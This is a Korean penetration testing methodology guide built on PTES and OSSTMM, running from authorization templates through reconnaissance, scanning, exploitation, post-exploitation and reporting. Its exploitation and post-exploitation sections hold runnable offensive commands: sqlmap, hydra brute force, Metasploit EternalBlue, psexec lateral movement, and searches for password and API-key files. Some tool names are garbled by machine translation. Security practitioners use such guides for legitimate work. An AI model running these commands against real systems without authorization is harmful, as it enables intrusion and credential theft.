# 침투 테스트 방법론

## 개요
PTES 및 OSSTMM과 같은 업계 표준에 부합하는 침투 테스트에 대한 체계적인 접근 방식입니다.

## 법적, 윤리적 고려 사항

### 사전 참여 요구 사항

**중요:**
- 테스트 전 서면 승인을 받으세요.
- 범위와 경계를 정의
- 참여 규칙을 정하라
- 사고 대응 계획을 준비하세요.
- 법규 준수 보장

### 승인 문서 템플릿
```
Penetration Testing Authorization Agreement

Project Name: _____________________________
Client Organization: _____________________
Test Period: ____________________________

Scope:
- IP Ranges: _________________________
- Domains: ___________________________
- Applications: _______________________

Out of Scope:
- Production systems (unless authorized)
- Third-party services
- Physical security

Rules of Engagement:
- No data exfiltration
- No destructive testing
- No social engineering
- Follow responsible disclosure

Authorized Tester:
Name: ________________________________
Signature: ___________________________
Date: _______________________________

Client Representative:
Name: ________________________________
Signature: ___________________________
Date: _______________________________
```
## 테스트 방법론

### PTES(침투 테스트 실행 표준)

#### 1단계: 참여 전 상호작용

**목표:**
- 범위와 목표를 정의
- 커뮤니케이션 채널 구축
- 기대치와 결과물 설정
- 법률 및 규정 준수 검토

**제공물:**
- 참여 규칙(RoE) 문서
- 작업 명세서(SOW)
- 비공개 계약(NDA)

#### 2단계: 정보 수집

**수동 정찰:**
```bash
# DNS enumeration
whois target.com
dig target.com ANY
nslookup target.com
host -t ns target.com

# Search engine reconnaissance
google site:target.com filetype:pdf
google site:target.com inurl:admin
google site:target.com ext:sql

# Social media analysis
google site:linkedin.com "target.com" employees
google site:twitter.com target.com
```
**능동적인 정찰:**
```bash
# Subdomain enumeration
sublist3r -d target.com
amass enum -d target.com
subfinder -d target.com

# Port scanning
nmap -sS -p- -T4 target.com
masscan -p1-65535 target.com --rate=1000

# Technology detection
whatweb target.com
wafw00f target.com
```
**도구:**
- Nmap, Masscan, Netdiscover
- Sublist3r, 축적, 서브파인더
- 후이즈, 디그, 호스트
- 구글 독스
- 내장, Wappalyzer

#### 3단계: 위협 모델링

**목표:**
- 잠재적인 공격 벡터 식별
- 데이터 흐름 이해
- 지도 애플리케이션 아키텍처
- 테스트 영역 우선순위 지정

**스트라이드 모델:**
- **S**푸핑: 공격자가 사용자를 가장할 수 있습니까?
- **T**ampering: 공격자가 데이터를 수정할 수 있습니까?
- **R**묵인: 공격자가 작업을 거부할 수 있습니까?
- **I**정보 공개: 공격자가 민감한 데이터에 접근할 수 있습니까?
- **서비스 거부: 공격자가 서비스를 중단시킬 수 있습니까?
- **권한 승격: 공격자가 더 높은 액세스 권한을 얻을 수 있습니까?

**제공물:**
- 위협 모델 문서
- 공격 트리 다이어그램
- 위험 매트릭스
- 테스트 우선순위

#### 4단계: 취약점 분석

**자동 스캔:**
```bash
# Web vulnerability scan
zap-cli quick-scan --self-contained http://target.com

# Network vulnerability scan
nessuscli scan new --targets target.com --name target_scan

# Container vulnerability scan
trivy image myapp:latest
```
**수동 테스트:**
- 입력 검증
- 인증 테스트
- 세션 관리
- 인증 테스트
- 비즈니스 로직 테스트

**도구:**
- OWASP ZAP, Burp Suite
- 네소스, OpenVAS
- Nmap 스크립트
- 수동 테스트 기술

#### 5단계: 공격

**규칙:**
- 위험을 입증하기 위한 목적으로만 악용
- 데이터 유출 없음
- 파괴적인 행동은 하지 않습니다.
- 모든 단계를 문서화하세요.

**악용 기법:**
```bash
# SQL Injection
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# XSS exploitation
xsser --url http://target.com --auto

# Password brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"

# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set LHOST local_ip
exploit
```
**안전 점검:**
- 대상 소유권 확인
- 먼저 스테이징에서 테스트
- 롤백 계획 준비
- 생산 영향 모니터링

#### 6단계: 공격 후

**목표:**
- 임팩트를 입증하다
- 데이터 노출 식별
- 측면 이동(승인된 경우)
- 지속성(승인된 경우)

**활동:**
```bash
# System reconnaissance
whoami
hostname
ipconfig / ifconfig
netstat -ano

# Privilege escalation
linpeas.sh
winpeas.exe
exploit suggester

# Data discovery
find / -name "*password*" -type f 2>/dev/null
grep -r "api_key" /var/www 2>/dev/null

# Lateral movement (authorized only)
net use * \\other-pc\c$
psexec \\other-pc cmd.exe
```
**도구:**
- 린PEAS, 윈PEAS
- Mimikatz(승인된 경우에만)
- 제국, 언약
- 블러드하운드(AD)

#### 7단계: 보고

**보고서 구조:**
1. 요약
2. 방법론
3. 세부 조사 결과
4. 위험 평가
5. 권고사항
6. 부록

**템플릿 찾는 중:**
```
### Finding #X: [Title]

**Severity:** Critical/High/Medium/Low
**CVSS Score:** X.X
**CWE:** CWE-XXX

**Description:**
[Vulnerability description]

**Affected System:**
- URL: [URL]
- File: [File]
- Line: [Line]

**Proof of Concept:**
```
배쉬/코드
[활용단계]
```

**Impact:**
- Confidentiality: [Impact]
- Integrity: [Impact]
- Availability: [Impact]

**Remediation:**
[Fix steps]

**References:**
- [OWASP reference]
- [CVE reference]
```
## OSSTMM(오픈소스 보안 테스트 방법론 매뉴얼)

### 보안 테스트 모듈

#### 1. 인간 안보
- 사회 공학
- 물리적 보안
- 인식 훈련

#### 2. 물리적 보안
- 접근 통제
- 감시
- 물리적 장벽

#### 3. 무선 보안
- WiFi 보안
- 블루투스 보안
- RFID/NFC 보안

#### 4. 통신 보안
- 음성 시스템
- 네트워크 인프라
- 모바일 장치

#### 5. 데이터 네트워크 보안
- 방화벽 구성
- 네트워크 세분화
- 침입 감지

#### 6. 데이터 통신 보안
- 암호화 프로토콜
- 인증서 관리
- 보안 프로토콜

#### 7. 애플리케이션 보안
- 웹 애플리케이션
- 모바일 애플리케이션
- API 보안

## 테스트 유형

### 블랙박스 테스트

**정의:** 대상 시스템에 대한 사전 지식이 없습니다.

**장점:**
- 실제 공격을 시뮬레이션합니다.
- 모든 외부 인터페이스를 테스트합니다.
- 편견 없는 관점

**단점:**
- 시간이 많이 걸린다
- 내부 취약점을 놓칠 수 있음
- 더 많은 정찰이 필요합니다

### 화이트 박스 테스트

**정의:** 대상 시스템에 대한 완전한 지식

**장점:**
- 더욱 포괄적인 적용 범위
- 더 빠른 테스트
- 내부 로직 테스트 가능

**단점:**
- 실제 공격자를 시뮬레이션하지 않습니다.
- 내부 지식에 의해 편향될 수 있음

### 그레이 박스 테스트

**정의:** 대상 시스템에 대한 부분적인 지식

**장점:**
- 균형 잡힌 접근
- 화이트박스보다 더 사실적
- 블랙박스보다 효율적

## 테스트 체크리스트

### 네트워크 보안
- [ ] 포트 스캔 완료
- [ ] 서비스 열거 완료
- [ ] 배너 잡기 수행됨
- [ ] SSL/TLS 구성이 확인되었습니다.
- [ ] 방화벽 규칙 테스트됨
- [ ] 네트워크 분할 확인됨

### 웹 애플리케이션 보안
- [ ] 정보 공개 확인됨
- [ ] 주입 취약점 테스트됨
- [ ] 인증 테스트됨
- [ ] 세션 관리 테스트됨
- [ ] 승인 테스트됨
- [ ] CSRF 보호 테스트됨
- [ ] XSS 테스트됨
- [ ] 파일 업로드 테스트됨
- [ ] 비즈니스 로직 테스트됨
- [ ] API 보안 테스트됨

### 시스템 보안
- [ ] 운영 체제 버전이 확인되었습니다.
- [ ] 패치 수준 확인됨
- [ ] 기본 자격 증명 테스트됨
- [ ] 잘못된 구성이 확인되었습니다.
- [ ] 권한 상승 테스트됨
- [ ] 서비스 강화 확인됨

### 데이터 보안
- [ ] 전송 중 암호화가 확인되었습니다.
- [ ] 미사용 암호화 확인됨
- [ ] 키 관리 검토
- [ ] 데이터 보존 확인됨
- [ ] 데이터 분류 확인됨

## 의사소통 계획

### 일일 업데이트
- 진행상황 요약
- 중요한 발견
- 방해 요소 또는 문제

### 주간 보고서
- 세부 진행사항
- 업데이트된 위험 평가
- 테스트 상태

### 최종 결과물
- 요약
- 기술 보고서
- 원시 스캔 데이터
- 교정 권장 사항
- 프레젠테이션 슬라이드

## 품질 보증

### 검토 체크리스트
- [ ] 모든 중요한 결과가 확인되었습니다.
- [ ] 오탐지 제거됨
- [ ] 증거가 문서화됨
- [ ] 테스트된 수정 단계
- [ ] 수석 테스터가 검토한 보고서
- [ ] 고객 검토 수행

### 재테스트 중
- 교정 확인
- 회귀가 없는지 확인
- 취약점 상태 업데이트
- 교정 확인 제공

## 사후 테스트 활동

### 보고
- 고객과 함께 결과 검토
- 교정 우선순위 논의
- 수정 일정 계획
- 재시험 일정 잡기

### 지식 이전
- 필요한 경우 교육을 제공합니다.
- 모범 사례 공유
- 추천 도구 및 프로세스

### 후속 조치
- 교정 진행 상황 확인
- 문제에 대한 지원 제공
- 진행 중인 평가 일정을 계획합니다.

## 도구 인벤토리

### 웹 애플리케이션 테스트
| 도구 | 목적 | 라이센스 |
|------|---------|----------|
| OWASP ZAP | 웹 스캐너 | 무료 |
| 버프 스위트 | 웹 프록시 | 무료/프로 |
| SQL맵 | SQL 주입 | 무료 |
| XSSer | XSS 테스트 | 무료 |
| 닉토 | 웹 스캐너 | 무료 |

### 네트워크 테스트
| 도구 | 목적 | 라이센스 |
|------|---------|----------|
| 엔맵 | 포트 스캐닝 | 무료 |
| 메타스플로잇 | 착취 | 무료 |
| 와이어샤크 | 패킷 분석 | 무료 |
| 네소스 | 취약점 검사 | 상업용 |### 비밀번호 크래킹
| 도구 | 목적 | 라이센스 |
|------|---------|----------|
| 존 더 리퍼 | 비밀번호 크래킹 | 무료 |
| 해시캣 | 비밀번호 크래킹 | 무료 |
| 히드라 | 무차별 대입 | 무료 |

### 무선 테스트
| 도구 | 목적 | 라이센스 |
|------|---------|----------|
| 에어크랙 | WiFi 크래킹 | 무료 |
| 와이파이 | WiFi 감사 | 무료 |
| 키즈멧 | WiFi 모니터링 | 무료 |

## 보고 모범 사례

### 요약
- 개략적인 개요
- 위험 중심
- 실행 가능한 권장 사항
- 비기술적인 언어

### 기술 세부정보
- 자세한 조사 결과
- 스크린샷/증거
- 단계별 교정
- 참고자료 및 자료

### 부록
- 도구 출력
- 구성 파일
- 네트워크 다이어그램
- 테스트 스크립트

## 참고자료

- [PTES 프레임워크](http://www.pentest-standard.org/)
- [OSSTMM 가이드](https://www.isecom.org/OSSTMM.3.pdf)
- [OWASP 테스트 가이드](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)